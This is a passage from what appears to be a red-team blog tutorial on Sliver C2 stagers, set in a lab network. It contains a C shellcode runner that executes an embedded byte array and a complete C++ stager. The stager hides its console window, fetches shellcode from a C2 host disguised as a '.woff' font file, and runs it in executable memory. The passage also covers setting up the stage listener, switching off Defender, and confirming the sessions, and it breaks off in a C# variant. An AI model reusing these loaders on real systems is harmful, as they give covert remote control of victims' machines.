    <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xff\xe7\x58\x6a\x00\x59\xbb\xe0\x1d\x2a\x0a\x41\x89\xda\xff</span><span style="color:#e6db74">&#34;</span>
    <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xd5</span><span style="color:#e6db74">&#34;</span>;


    <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>exec <span style="color:#f92672">=</span> VirtualAlloc(<span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">sizeof</span> shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(exec, shellcode, <span style="color:#66d9ef">sizeof</span> shellcode);
    ((<span style="color:#66d9ef">void</span>(<span style="color:#f92672">*</span>)())exec)();

    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
}
</code></pre></div><p>This program does three things.
First it calls a function <a href="https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc">VirtualAlloc</a>,
which allocates memory within the current process and returns the memory address (<code>exec</code>).
With the call above, we tell it to allocate exactly as much memory as we need for the shellcode (<code>sizeof shellcode</code>).
The last of the arguments (<code>PAGE_EXECUTE_READWRITE</code>) is a memory protection constant (<code>0x40</code>) and means
that we can read and write to this part of the memory and execute it as code
(<a href="https://learn.microsoft.com/en-us/windows/win32/Memory/memory-protection-constants">Microsoft Docs</a>).</p>
<p>The next step is to copy the shellcode into this memory region.
This is what the function <a href="https://learn.microsoft.com/en-us/cpp/c-runtime-library/reference/memcpy-wmemcpy?view=msvc-170">memcpy</a> does.
It copies to a destination (<code>exec</code>) from a source (<code>shellcode</code>) and you have to tell it how many bytes (<code>sizeof shellcode</code>).</p>
<p>Finally, the rather cryptic line <code>((void(*)())exec)();</code> casts <code>exec</code> into a function pointer and calls it.
The effect of that is that the programs jumps to the shellcode at <code>exec</code>.</p>
<p>Almost there. We have to compile it.
MinGW should be installed with Sliver, so on the C2 server you should be able to do this:
<code>x86_64-w64-mingw32-gcc -o runner.exe runner.c</code>.
Now we have something to double-click!</p>
<p>To see the runner in action, transfer it to the target Windows host,
ensure Microsoft Defender is off and run it.</p>











<figure>
  
    
      <img class="lazyload" data-src="/img/29_sliver_c2_stagers/stager_executed.png"  />
    
  
  
  <figcaption>
    <header><b>Downloading and executing runner.exe, the stager</b></header>
    
  </figcaption>
  
</figure>
<style media="screen">
  .blur-up {
    -webkit-filter: blur(5px);
    filter: blur(5px);
    transition: filter 400ms, -webkit-filter 400ms;
  }
  .blur-up.lazyloaded {
    -webkit-filter: blur(0);
    filter: blur(0);
  }
</style>

<p>The session should appear in Sliver, which confirms that the stager did it&rsquo;s job:</p>
<pre tabindex="0"><code>[*] Session 282c3e4d FAR_EYE - 192.168.122.32:49928 (DESKTOP-2CNJ1IR) - windows/amd64 - Thu, 08 Sep 2022 21:59:20 CEST

sliver &gt; sessions

 ID         Transport   Remote Address         Hostname          Username   Operating System   Health  
========== =========== ====================== ================= ========== ================== =========
 282c3e4d   mtls        192.168.122.32:49928   DESKTOP-2CNJ1IR   tester     windows/amd64      [ALIVE]
</code></pre><p>If you leave Wireshark running while doing all this,
you can see how the stager downloads the Sliver C2 shellcode.
This was the TCP connection to port 8443 of the C2 server, where the stage listener was waiting:</p>











<figure>
  
    
      <img class="lazyload" data-src="/img/29_sliver_c2_stagers/main_shellcode_download.png"  />
    
  
  
  <figcaption>
    <header><b>Stager downloads the main Sliver shellcode defined in profile win64</b></header>
    
  </figcaption>
  
</figure>
<style media="screen">
  .blur-up {
    -webkit-filter: blur(5px);
    filter: blur(5px);
    transition: filter 400ms, -webkit-filter 400ms;
  }
  .blur-up.lazyloaded {
    -webkit-filter: blur(0);
    filter: blur(0);
  }
</style>

<p>You can see that all sorts of readable strings were transmitted as part of the data, among them well-known ones
like <code>AmsiScanBuffer</code>. AVs or Firewalls would not like to see that.</p>
<p>Anyways, looking forward, you can see another connection shortly after, this time port 8888 of the C2 server.
A DNS query for <code>sliver.labnet.local</code> happened right before that.
All this suggests that this is the implant establishing the mTLS C2 connection:</p>











<figure>
  
    
      <img class="lazyload" data-src="/img/29_sliver_c2_stagers/main_shellcode_execute.png"  />
    
  
  
  <figcaption>
    <header><b>Main shellcode of Sliver establishes mTLS C2 connection</b></header>
    
  </figcaption>
  
</figure>
<style media="screen">
  .blur-up {
    -webkit-filter: blur(5px);
    filter: blur(5px);
    transition: filter 400ms, -webkit-filter 400ms;
  }
  .blur-up.lazyloaded {
    -webkit-filter: blur(0);
    filter: blur(0);
  }
</style>

<p>This was it for the basic stager example.</p>
<h2 id="custom-stagers">Custom stagers</h2>
<p>Since we had to write our own code anyways, why not go all in on customization and write stagers from scratch?
This gives the greatest degree of control over what is going on while Sliver is loaded.
The <a href="https://github.com/BishopFox/sliver/wiki/Stagers#custom-stagers">Sliver wiki</a> provides some information
on custom stagers and even C# code samples to users get started.
Here, I&rsquo;ll provide a few samples more, written in C++, C# and PowerShell.</p>
<p>Writing custom stagers can make a lot of sense if you want to load implant shellcode via HTTP.
For example, the target machine may be forced through a web proxy for internet access.
Or you may be worried that a plain TCP connection to an IP address is too suspicious.</p>
<p>All you have to do to serve stages via HTTP is to specify this as a protocol in the URL.
The listener will then serve shellcode for all requests to URLs ending on the <code>stager_file_ext</code> setting
defined in the <a href="https://github.com/BishopFox/sliver/wiki/HTTP(S)-C2#implant_config">HTTP C2 options</a>,
located at <code>/root/.sliver/configs/http-c2.json</code>. By default, the value is <code>.woff</code>.
See also
<a href="../../post/learning_sliver_c2_04_transports_in_detail_http_and_https/#understanding-and-configuring-the-c2-traffic">a previous post</a>
for a discussion of the options.</p>
<p>Now connect to Sliver on the C2 server, kill the old TCP listener (with <code>jobs --kill 2</code>)
and run a new HTTP listener with a URL scheme <code>http://</code> (of course you could use <code>https://</code> as well):</p>
<pre tabindex="0"><code>sliver &gt; stage-listener --url http://sliver.labnet.local:80 --profile win64

[*] No builds found for profile win64, generating a new one
[*] Job 3 (http) started

sliver &gt; jobs

 ID   Name   Protocol   Port 
==== ====== ========== ======
 1    mtls   tcp        8888 
 3    http   tcp        80
</code></pre><p>To test the stage listener, just download the shellcode with <code>wget</code>
and convince yourself that everything works as expected.
You can request any path as long as it ends on <code>.woff</code>.
A value such as <code>/fontawesome.woff</code> may look innocent at first sight,
so I&rsquo;ll use it from now on:</p>
<pre tabindex="0"><code>┌──(kali㉿kali)-[~]
└─$ wget -q http://localhost:80/fontawesome.woff
                                                                                                                                                                                   
┌──(kali㉿kali)-[~]
└─$ cat fontawesome.woff| xxd | head -n 5       
00000000: 4883 e4f0 4883 c408 e880 f77a 0080 f77a  H...H......z...z
00000010: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000020: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000030: 0000 0000 0000 0000 0000 0000 00a0 52d2  ..............R.
00000040: 55f6 a322 83f7 9a15 705a 2f9a 5f79 dfc1  U..&quot;....pZ/._y..
</code></pre><p>Indeed, this stage listener just returns the shellcode in the HTTP response body.
It should be straightforward to build clients.
Here is how to build stagers in three different ways, C++, C# and PowerShell.</p>
<p>As for proxy awareness, all three stagers use a proxy configured in the system settings
without any further configuration.
I&rsquo;ve tested it with my proxy configuration shown in <a href="../../post/learning_sliver_c2_04_transports_in_detail_http_and_https/#configure-the-target-to-use-the-proxy">a previous post</a>.</p>
<h3 id="c-stager">C++ stager</h3>
<p>For the C++ stager, the plan is to use the
<a href="https://learn.microsoft.com/en-us/cpp/mfc/wininet-basics">WinInet library</a>
for HTTP requests, then apply the same code we&rsquo;ve seen above to execute shellcode.
Arguments for or against WinInet can be found <a href="../../post/learning_sliver_c2_04_transports_in_detail_http_and_https/#getting-a-beacon-on-https">here</a>.
If you wanted to avoid it, a minimal standalone library like <a href="https://github.com/yhirose/cpp-httplib">cpp-httplib</a>
you be swapped in.</p>
<p>While cross-compiling the stagers is probably within the realm of possibility,
it&rsquo;s best to develop Windows programs on Windows. My experience is that Windows and
Visual Studio make things a lot easier. To avoid spinning up yet another development
VM, I&rsquo;d recommend to just reuse the Windows target as a development machine.
You may want to create an
<a href="https://support.microsoft.com/en-us/windows/add-an-exclusion-to-windows-security-811816c0-4dfd-af4a-47e4-c301afe13b26">exclusion for a folder</a>
in Defender to make sure it does not delete your Visual Studio workspace.</p>
<p>For this post, I&rsquo;ve installed Visual Studio 2022. I&rsquo;m sure you know how to to that.
During installation, add the &ldquo;Desktop Development with C++&rdquo; feature,
then switch to &ldquo;Individual Components&rdquo; in the VS installer and ensure the following components are also installed:</p>
<ul>
<li>&ldquo;MSVC v143 – VS 2022 C++ x64/x86 build tools (latest)&rdquo;</li>
<li>&ldquo;C++ MFC for v143 build tools (x86 &amp; x64)&rdquo;</li>
<li>&ldquo;C++ ATL for v143 build tools (x86 &amp; x64)&rdquo;</li>
</ul>
<p>These instructions are specific to Visual Studio 2022.
If you use Visual Studio 2019 or 2017, try replacing v143 with v142 or 141 respectively and it may work.</p>
<p>Time to write the code.
The skeleton looks like this:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp"><span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">Shellcode</span> {
	byte<span style="color:#f92672">*</span> data;
	DWORD len;
};

Shellcode <span style="color:#a6e22e">Download</span>(LPCWSTR host, INTERNET_PORT port);
<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">Execute</span>(Shellcode shellcode);

<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>() {
	<span style="color:#f92672">::</span>ShowWindow(<span style="color:#f92672">::</span>GetConsoleWindow(), SW_HIDE); <span style="color:#75715e">// hide console window
</span><span style="color:#75715e"></span>
	Shellcode shellcode <span style="color:#f92672">=</span> Download(<span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;sliver.labnet.local&#34;</span>, <span style="color:#ae81ff">80</span>);
	Execute(shellcode);

	<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
}
</code></pre></div><p>This code defines a struct <code>Shellcode</code> which stores a pointer to some memory together with the length of this data.
After that, two function prototypes are declared: <code>Download</code> shall download the shellcode from a <code>host</code> and <code>port</code>,
<code>Execute</code> should execute it.
The reason I define the prototypes is so that I can put the <code>main</code> function at the top of the file before
these two functions are declared. The compiler likes it only this way.
In function <code>main</code>, the <code>Download</code> and <code>Execute</code> functions are used.
At the beginning though, there is <code>::ShowWindow(::GetConsoleWindow(), SW_HIDE);</code>.
This line ensures that the console windows is not shown (comment out this line to see it).</p>
<p>Our function <code>Download</code> starts like this (arguments redacted for readability,
the ones not shown can be set to 0):</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp">Shellcode <span style="color:#a6e22e">Download</span>(LPCWSTR host, INTERNET_PORT port) {
	HINTERNET session <span style="color:#f92672">=</span> InternetOpen(<span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;&lt;user-agent&gt;&#34;</span>, INTERNET_OPEN_TYPE_PRECONFIG, ...);
	HINTERNET connection <span style="color:#f92672">=</span> InternetConnect(session, host, port, ...);
	HINTERNET request <span style="color:#f92672">=</span> HttpOpenRequest(connection, <span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;GET&#34;</span>, <span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;/fontawesome.woff&#34;</span>, ...);
	
	...
	
	InternetCloseHandle(request);
	InternetCloseHandle(connection);
	InternetCloseHandle(session);
	
	...
}
</code></pre></div><p>These three functions are WinInet-specific.
<a href="https://learn.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetopena">InternetOpen</a>
is a kind of initializer for WinInet. You can specify a User-Agent string used in HTTP requests (1st argument).
You can also specify an access type (2nd argument). With <code>INTERNET_OPEN_TYPE_PRECONFIG</code> we tell it to retrieve
proxy configuration from the system.</p>
<p>Function <a href="https://learn.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetconnecta">InternetConnect</a>
creates a network connection to a <code>host</code> and <code>port</code>. You have to give it the <code>session</code> too.</p>
<p>Finally, <a href="https://learn.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-httpopenrequesta">HttpOpenRequest</a>
is what actually creates a handle to the HTTP request, based on the <code>connection</code>.
This is where you specify the HTTP method (2nd argument) and URI path (3rd argument).</p>
<p>With all of this done, the HTTP request is prepared.
You can work with it now but should not forget to close all three handles when you are done.
This is what <code>InternetCloseHandle</code> is good for.</p>
<p>To actually send the HTTP requests, I then wrote the following code:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp">Shellcode <span style="color:#a6e22e">Download</span>(LPCWSTR host, INTERNET_PORT port) {
	...
	
	WORD counter <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
	<span style="color:#66d9ef">while</span> (<span style="color:#f92672">!</span>HttpSendRequest(request, NULL, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>)) {
		<span style="color:#75715e">//printf(&#34;Error sending HTTP request: : (%lu)\n&#34;, GetLastError()); // only for debugging
</span><span style="color:#75715e"></span>
		counter<span style="color:#f92672">++</span>;
		Sleep(<span style="color:#ae81ff">3000</span>);
		<span style="color:#66d9ef">if</span> (counter <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">3</span>) {
			exit(<span style="color:#ae81ff">0</span>); <span style="color:#75715e">// HTTP requests eventually failed
</span><span style="color:#75715e"></span>		}
	}
	
	...
}
</code></pre></div><p>This code uses the handle to the <code>request</code> and passes it to the WinInet function
<a href="https://learn.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-httpsendrequesta">HttpSendRequest</a>.
It is this point in the code where the HTTP request actually gets sent.
If it works, the function returns <code>TRUE</code>, else you get <code>FALSE</code> back.</p>
<p>To account for possible network problems, this code retries failed HTTP requests
after a 3 second (3000 microseconds) wait. This is what the while loop is good for.
If it did not work after 3 tries, we exit.</p>
<p>The next piece of code is used to read the result into a buffer called <code>payload</code>.
Of course we don&rsquo;t know how large the shellcode will be, so we do not know how large
a buffer we should allocate.
To deal with that, we define another buffer called <code>buffer</code> with a size of <code>BUFSIZ</code>
(which basically means we
<a href="https://www.gnu.org/software/libc/manual/html_node/Controlling-Buffering.html#index-BUFSIZ">let the compiler decide</a>
how big it should be).
In a loop, we then use the <code>buffer</code> to read chunks of data which we copy over to <code>payload</code>.
If <code>payload</code> is too small, we double it&rsquo;s size using the <code>realloc</code> function before copying data over.
We know that we are done when the function
<a href="https://learn.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetreadfile">InternetReadFile</a>
used to read data from the <code>request</code> does not return bytes anymore.
In that case, we break out of the loop, shrink the <code>payload</code> buffer to the correct size (again with <code>realloc</code>)
and we are done.
The shellcode should now be in <code>payload</code> and <code>payloadSize</code> stores it&rsquo;s length.</p>
<p>This is the code:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp">Shellcode <span style="color:#a6e22e">Download</span>(LPCWSTR host, INTERNET_PORT port) {
	...
	
	DWORD bufSize <span style="color:#f92672">=</span> BUFSIZ;
	byte<span style="color:#f92672">*</span> buffer <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> byte[bufSize];

	DWORD capacity <span style="color:#f92672">=</span> bufSize;
	byte<span style="color:#f92672">*</span> payload <span style="color:#f92672">=</span> (byte<span style="color:#f92672">*</span>)malloc(capacity);

	DWORD payloadSize <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;

	<span style="color:#66d9ef">while</span> (true) {
		DWORD bytesRead;

		<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>InternetReadFile(request, buffer, bufSize, <span style="color:#f92672">&amp;</span>bytesRead)) {
			<span style="color:#75715e">//printf(&#34;Error reading internet file : &lt;%lu&gt;\n&#34;, GetLastError()); // only for debugging
</span><span style="color:#75715e"></span>			exit(<span style="color:#ae81ff">0</span>);
		}

		<span style="color:#66d9ef">if</span> (bytesRead <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) <span style="color:#66d9ef">break</span>;

		<span style="color:#66d9ef">if</span> (payloadSize <span style="color:#f92672">+</span> bytesRead <span style="color:#f92672">&gt;</span> capacity) {
			capacity <span style="color:#f92672">*=</span> <span style="color:#ae81ff">2</span>;
			byte<span style="color:#f92672">*</span> newPayload <span style="color:#f92672">=</span> (byte<span style="color:#f92672">*</span>)realloc(payload, capacity);
			payload <span style="color:#f92672">=</span> newPayload;
		}

		<span style="color:#66d9ef">for</span> (DWORD i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> bytesRead; i<span style="color:#f92672">++</span>) {
			payload[payloadSize<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> buffer[i];
		}
		
	}
	byte<span style="color:#f92672">*</span> newPayload <span style="color:#f92672">=</span> (byte<span style="color:#f92672">*</span>)realloc(payload, payloadSize);
	
	...
}
</code></pre></div><p>The handles for the HTTP session, connection and request can now be closed.
We saw above how that is done.
All that is left in the download function is to create the <code>Shellcode</code> struct,
set its values and return it.
Straightforward:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp">Shellcode <span style="color:#a6e22e">Download</span>(LPCWSTR host, INTERNET_PORT port) {
	...
	
	<span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">Shellcode</span> out;
	out.data <span style="color:#f92672">=</span> payload;
	out.len <span style="color:#f92672">=</span> payloadSize;
	<span style="color:#66d9ef">return</span> out;
}
</code></pre></div><p>The function <code>Download</code> is done, so it&rsquo;s time to write the <code>Execute</code> function.
It takes the shellcode as it&rsquo;s only argument and just executes it.
We discussed above how to get this done.
Here is the function:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp"><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">Execute</span>(Shellcode shellcode) {
	<span style="color:#66d9ef">void</span><span style="color:#f92672">*</span> exec <span style="color:#f92672">=</span> VirtualAlloc(<span style="color:#ae81ff">0</span>, shellcode.len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	memcpy(exec, shellcode.data, shellcode.len);
	((<span style="color:#66d9ef">void</span>(<span style="color:#f92672">*</span>)())exec)();
}
</code></pre></div><p>This is it. The complete final code including all required imports looks as follows:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;windows.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;wininet.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e"></span>
<span style="color:#75715e">#pragma comment (lib, &#34;Wininet.lib&#34;)
</span><span style="color:#75715e"></span>

<span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">Shellcode</span> {
	byte<span style="color:#f92672">*</span> data;
	DWORD len;
};

Shellcode <span style="color:#a6e22e">Download</span>(LPCWSTR host, INTERNET_PORT port);
<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">Execute</span>(Shellcode shellcode);

<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>() {
	<span style="color:#f92672">::</span>ShowWindow(<span style="color:#f92672">::</span>GetConsoleWindow(), SW_HIDE); <span style="color:#75715e">// hide console window
</span><span style="color:#75715e"></span>
	Shellcode shellcode <span style="color:#f92672">=</span> Download(<span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;sliver.labnet.local&#34;</span>, <span style="color:#ae81ff">80</span>);
	Execute(shellcode);

	<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
}

Shellcode <span style="color:#a6e22e">Download</span>(LPCWSTR host, INTERNET_PORT port) {
	HINTERNET session <span style="color:#f92672">=</span> InternetOpen(
		<span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36&#34;</span>,
		INTERNET_OPEN_TYPE_PRECONFIG,
		NULL,
		NULL,
		<span style="color:#ae81ff">0</span>);

	HINTERNET connection <span style="color:#f92672">=</span> InternetConnect(
		session,
		host,
		port,
		<span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;&#34;</span>,
		<span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;&#34;</span>,
		INTERNET_SERVICE_HTTP,
		<span style="color:#ae81ff">0</span>,
		<span style="color:#ae81ff">0</span>);

	HINTERNET request <span style="color:#f92672">=</span> HttpOpenRequest(
		connection,
		<span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;GET&#34;</span>,
		<span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;/fontawesome.woff&#34;</span>,
		NULL,
		NULL,
		NULL,
		<span style="color:#ae81ff">0</span>,
		<span style="color:#ae81ff">0</span>);

	WORD counter <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
	<span style="color:#66d9ef">while</span> (<span style="color:#f92672">!</span>HttpSendRequest(request, NULL, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>)) {
		<span style="color:#75715e">//printf(&#34;Error sending HTTP request: : (%lu)\n&#34;, GetLastError()); // only for debugging
</span><span style="color:#75715e"></span>
		counter<span style="color:#f92672">++</span>;
		Sleep(<span style="color:#ae81ff">3000</span>);
		<span style="color:#66d9ef">if</span> (counter <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">3</span>) {
			exit(<span style="color:#ae81ff">0</span>); <span style="color:#75715e">// HTTP requests eventually failed
</span><span style="color:#75715e"></span>		}
	}

	DWORD bufSize <span style="color:#f92672">=</span> BUFSIZ;
	byte<span style="color:#f92672">*</span> buffer <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> byte[bufSize];

	DWORD capacity <span style="color:#f92672">=</span> bufSize;
	byte<span style="color:#f92672">*</span> payload <span style="color:#f92672">=</span> (byte<span style="color:#f92672">*</span>)malloc(capacity);

	DWORD payloadSize <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;

	<span style="color:#66d9ef">while</span> (true) {
		DWORD bytesRead;

		<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>InternetReadFile(request, buffer, bufSize, <span style="color:#f92672">&amp;</span>bytesRead)) {
			<span style="color:#75715e">//printf(&#34;Error reading internet file : &lt;%lu&gt;\n&#34;, GetLastError()); // only for debugging
</span><span style="color:#75715e"></span>			exit(<span style="color:#ae81ff">0</span>);
		}

		<span style="color:#66d9ef">if</span> (bytesRead <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) <span style="color:#66d9ef">break</span>;

		<span style="color:#66d9ef">if</span> (payloadSize <span style="color:#f92672">+</span> bytesRead <span style="color:#f92672">&gt;</span> capacity) {
			capacity <span style="color:#f92672">*=</span> <span style="color:#ae81ff">2</span>;
			byte<span style="color:#f92672">*</span> newPayload <span style="color:#f92672">=</span> (byte<span style="color:#f92672">*</span>)realloc(payload, capacity);
			payload <span style="color:#f92672">=</span> newPayload;
		}

		<span style="color:#66d9ef">for</span> (DWORD i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> bytesRead; i<span style="color:#f92672">++</span>) {
			payload[payloadSize<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> buffer[i];
		}
		
	}
	byte<span style="color:#f92672">*</span> newPayload <span style="color:#f92672">=</span> (byte<span style="color:#f92672">*</span>)realloc(payload, payloadSize);

	InternetCloseHandle(request);
	InternetCloseHandle(connection);
	InternetCloseHandle(session);

	<span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">Shellcode</span> out;
	out.data <span style="color:#f92672">=</span> payload;
	out.len <span style="color:#f92672">=</span> payloadSize;
	<span style="color:#66d9ef">return</span> out;
}

<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">Execute</span>(Shellcode shellcode) {
	<span style="color:#66d9ef">void</span><span style="color:#f92672">*</span> exec <span style="color:#f92672">=</span> VirtualAlloc(<span style="color:#ae81ff">0</span>, shellcode.len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	memcpy(exec, shellcode.data, shellcode.len);
	((<span style="color:#66d9ef">void</span>(<span style="color:#f92672">*</span>)())exec)();
}
</code></pre></div><p>Time to build the executable.
In Visual Studio, hit &ldquo;Build&rdquo;, then &ldquo;Build Solution&rdquo;.
Ensure that &ldquo;x64&rdquo; is selected (compare screenshot below) because our shellcode is 64 bit.
Select &ldquo;x86&rdquo; and the program will crash when you execute it.
If the build was successful, locate the executable in Windows Explorer.
The build logs tell you where it was saved:</p>











<figure>
  
    
      <img class="lazyload" data-src="/img/29_sliver_c2_stagers/build_custom_cpp_stager.png"  />
    
  
  
  <figcaption>
    <header><b>Building the custom stager with Visual Studio on Windows</b></header>
    
  </figcaption>
  
</figure>
<style media="screen">
  .blur-up {
    -webkit-filter: blur(5px);
    filter: blur(5px);
    transition: filter 400ms, -webkit-filter 400ms;
  }
  .blur-up.lazyloaded {
    -webkit-filter: blur(0);
    filter: blur(0);
  }
</style>

<p>Double-click the EXE and you should get the shell in Sliver:</p>
<pre tabindex="0"><code>[*] Session f561a33f LIKELY_CLIMATE - 192.168.122.32:51175 (DESKTOP-2CNJ1IR) - windows/amd64 - Thu, 22 Sep 2022 22:35:51 CEST

sliver &gt; use f561a33f-d397-4d92-944f-64a563c9f5bc

[*] Active session LIKELY_CLIMATE (f561a33f-d397-4d92-944f-64a563c9f5bc)

sliver (LIKELY_CLIMATE) &gt; whoami

Logon ID: DESKTOP-2CNJ1IR\tester
[*] Current Token ID: DESKTOP-2CNJ1IR\tester
</code></pre><p>On the target Windows machine you don&rsquo;t see anything except a new process called &ldquo;stagers.exe&rdquo;,
with a &ldquo;conhost.exe&rdquo; child process.
This is because we made the console window invisible so that the process runs in the background.
Use the amazing tool <a href="https://processhacker.sourceforge.io/">Process Hacker</a> to see all the details about the process:</p>











<figure>
  
    
      <img class="lazyload" data-src="/img/29_sliver_c2_stagers/stager_running_process_hacker.png"  />
    
  
  
  <figcaption>
    <header><b>You can see the stager process running on the target machine</b></header>
    
  </figcaption>
  
</figure>
<style media="screen">
  .blur-up {
    -webkit-filter: blur(5px);
    filter: blur(5px);
    transition: filter 400ms, -webkit-filter 400ms;
  }
  .blur-up.lazyloaded {
    -webkit-filter: blur(0);
    filter: blur(0);
  }
</style>

<p>Note that real malware will often not keep the stager binary running as a standalone process.
Rather, it will inject itself into another process so that it&rsquo;s not visible in the list of processes.
This is stuff for another day though.</p>
<h3 id="c-net-stager">C# .NET Stager</h3>
<p>In Visual Studio, create another solution but pick a .NET application this time.
(ensure that in the Visual Studio Installer you have added all components related to .NET Desktop Development).
Initially, I&rsquo;ve created a console application for development so that I could print debug infos to the console.
When you are done developing, you can apply the following configuration to make the console window disappear.
Open the configuration of the project properties and make your program a &ldquo;Windows Application&rdquo;,
which is a Windows GUI program. Unless you actually create a GUI, nothing will be visible:</p>











<figure>
  
    
      <img class="lazyload" data-src="/img/29_sliver_c2_stagers/dotnet_config_windows_application.png"  />
    
  
  
  <figcaption>
    <header><b>Selecting Windows Application as the application type</b></header>
    
  </figcaption>
  
</figure>
<style media="screen">
  .blur-up {
    -webkit-filter: blur(5px);
    filter: blur(5px);
    transition: filter 400ms, -webkit-filter 400ms;
  }
  .blur-up.lazyloaded {
    -webkit-filter: blur(0);
    filter: blur(0);
  }
</style>

<p>You can set it back to &ldquo;Console Application&rdquo; any time to get the window back.
While we are in the settings, also ensure that the platform target is &ldquo;x64&rdquo;.
Set this explicitly and don&rsquo;t use the &ldquo;Any CPU&rdquo; so that the process architecture always fits to the shellcode:</p>











<figure>
  
    
      <img class="lazyload" data-src="/img/29_sliver_c2_stagers/dotnet_config_x64_arch.png"  />
    
  
  
  <figcaption>
    <header><b>Selecting x64 as the target architecture</b></header>
    
  </figcaption>
  
</figure>
<style media="screen">
  .blur-up {
    -webkit-filter: blur(5px);
    filter: blur(5px);
    transition: filter 400ms, -webkit-filter 400ms;
  }
  .blur-up.lazyloaded {
    -webkit-filter: blur(0);
    filter: blur(0);
  }
</style>

<p>Now we create the actual code.
It is similar to the C++ stager but considerably shorter.
We start with a <code>Main</code> function that Downloads and executes shellcode:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c#" data-lang="c#"><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> Main(String[] args)
{
    <span style="color:#66d9ef">byte</span>[] shellcode = Download(<span style="color:#e6db74">&#34;http://sliver.labnet.local/fontawesome.woff&#34;</span>);
    Execute(shellcode);

    <span style="color:#66d9ef">return</span>;
}
</code></pre></div><p>I&rsquo;ve kept the function <code>Download</code> simple this time and left out retry logic.
All the function does is create an instance of a
<a href="https://learn.microsoft.com/en-us/dotnet/api/system.net.webclient">System.Net.WebClient</a>
